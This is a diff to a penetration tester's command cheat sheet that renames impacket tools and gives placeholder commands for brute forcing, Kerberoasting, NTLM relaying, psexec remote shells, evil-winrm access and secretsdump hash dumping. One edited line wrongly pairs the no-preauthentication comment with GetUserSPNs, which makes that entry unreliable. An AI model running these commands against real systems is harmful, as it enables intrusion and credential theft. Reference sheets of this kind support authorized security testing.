@@ -16,20 +16,20 @@ dirsearch -u '<target-url>' -b -F -r --recursion-depth=<l> --full-url --format=c
 # evil-winrm interactive shell with username and password or hash
 evil-winrm -i <target-ip> -u <username> [-p <password> | -H <hash>]
 
-# ffuf keyword FUZZ in a request file; --request the request file; -w path to wordlist; -t threads; -f[clrsw] filter code,lines,regex,size,words; -m[clrsw] match  
+# ffuf keyword FUZZ in a request file; --request the request file; -w path to wordlist; -t threads; -f[clrsw] filter code,lines,regex,size,words; -m[clrsw] match
 ffuf --request <req-file> -w <wordlist> -t <t> -fs <filter-size> [--request-proto http --replay-proxy http://127.0.0.1:8080]
 
-# GetADUsers.py enumerate AD users with and password
-GetADUsers.py -all '<fqdn>/[<username>:<password>]' -dc-ip <dc-ip-address>
+# impacket-GetADUsers enumerate AD users with and password
+impacket-GetADUsers -all '<fqdn>/[<username>:<password>]' -dc-ip <dc-ip-address>
 
-# GetADUsers.py enumerate AD users with hash
-GetADUsers.py -all '<fqdn>/<username>' -dc-ip <dc-ip-address> -hashes '<LMHASH>:<NTHASH>'
+# impacket-GetADUsers enumerate AD users with hash
+impacket-GetADUsers -all '<fqdn>/<username>' -dc-ip <dc-ip-address> -hashes '<LMHASH>:<NTHASH>'
 
-# GetNPUsers.py get all users and hashes in AD that have NO preauthentication enabled
-GetNPUsers.py '<fqdn>/[<username>]'  -dc-ip <dc-ip> [-request -outputfile <out-file>]
+# impacket-GetUserSPNs get all users and hashes in AD that have NO preauthentication enabled
+impacket-GetUserSPNs '<fqdn>/[<username>]'  -dc-ip <dc-ip> [-request -outputfile <out-file>]
 
-# GetUserSPNs.py get user accounts with more than one service principal name (= kerberoastable) and request a TGS for them
-GetUserSPNs.py '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-file>]
+# impacket-GetUserSPNs get user accounts with more than one service principal name (= kerberoastable) and request a TGS for them
+impacket-GetUserSPNs '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-file>]
 
 # gobuster fuzz for directories with wordlist; -o out file, -r follow redirects, -k ignore ssl certificate errors, -w wordlist, -x file extensions to append
 gobuster dir -u '<target-url>' -o <out-file> -r -k -w <path-to-wordlist> [-x php,aspx,html,txt]
@@ -40,7 +40,7 @@ hashcat --example-hashes
 # hashcat generate a password list with a given start list and a given rule
 hashcat --force --stdout -r <path-to-rule> <in-list>
 
-# hydra brute force different protocols; -V show all attempts; -t number of threads; protocol can be [ssh|rdp|ftp|imap|mssql|mysql|oracle-*|smtp|smb|vnc|...] 
+# hydra brute force different protocols; -V show all attempts; -t number of threads; protocol can be [ssh|rdp|ftp|imap|mssql|mysql|oracle-*|smtp|smb|vnc|...]
 hydra -V [-t <threads>] -L <user-file> -P <password-file> <protocol>://<target.ip>
 
 # kerbrute bruteforce; -dc dc ip; -d fqdn; -o outfile; -v verbose; list of usernames and passwords separated by ":" ;
@@ -76,11 +76,11 @@ msfvenom -l payloads
 # nikto with conssole output an html outfile; -Tuning 1234bde Test for 1: Interesting File / Seen in logs 2: Misconfiguration / Default File 3: Information Disclosure 4: Injection (XSS/Script/HTML)  b: Software Identification
 nikto -Display 1234EP -Tuning 1234bde -o <file-name>.html -Format htm -host '<target-url>'
 
-# ntlmrealyx LDAP/SMB... relaying attack; -tf Tagget file; with -t ldap://<ip>, ldaps://<ip>, smb://<ip> single target
-ntlmrelayx.py -tf <dc-ip.list>
+# impacket-ntlmrelayx LDAP/SMB... relaying attack; -tf Tagget file; with -t ldap://<ip>, ldaps://<ip>, smb://<ip> single target
+impacket-ntlmrelayx -tf <dc-ip.list>
 
-# psexec interactive shell as Administrator with username and password or with hashes
-psexec.py '<fqdn>/<username>[:<password>]@<target-ip-or-host>' [-hashes LMHASH:NTHASH] [-dc-ip <dc-ip>]
+# impacket-psexec interactive shell as Administrator with username and password or with hashes
+impacket-psexec '<fqdn>/<username>[:<password>]@<target-ip-or-host>' [-hashes LMHASH:NTHASH] [-dc-ip <dc-ip>]
 
 # Responder.py analyze mode; Listen for packages and list them on screen
 Responder.py -I <interface> -A
@@ -91,11 +91,11 @@ Responder.py -I <interface>
 # rpcclient interactive session; -U <user>; -N anonymous login
 rpcclient [-U <user>| -N] <target-ip-or-domain>
 
-# secretsdump.py dump hashes remotely
-secretsdump.py '<fqdn">/<username>:<password>@<target-ip-or-hostname>' -dc-ip <dc-ip> -outputfile <out-file>
+# impacket-secretsdump dump hashes remotely
+impacket-secretsdump '<fqdn">/<username>:<password>@<target-ip-or-hostname>' -dc-ip <dc-ip> -outputfile <out-file>
 
-# secretsdump.py dump hashes from a local copy of sam system and security hives
-secretsdump.py -sam <path-to-sam> -system <path-to-system> -security <path-to-security> LOCAL -outputfile <out-file>
+# impacket-secretsdump dump hashes from a local copy of sam system and security hives
+impacket-secretsdump -sam <path-to-sam> -system <path-to-system> -security <path-to-security> LOCAL -outputfile <out-file>
 
 # smbclient interactive smb connection; -W domain; -U user name
 smbclient \\\\<ip-or-hostname>\\<share-name> [-W <domain-name> -U <user>]
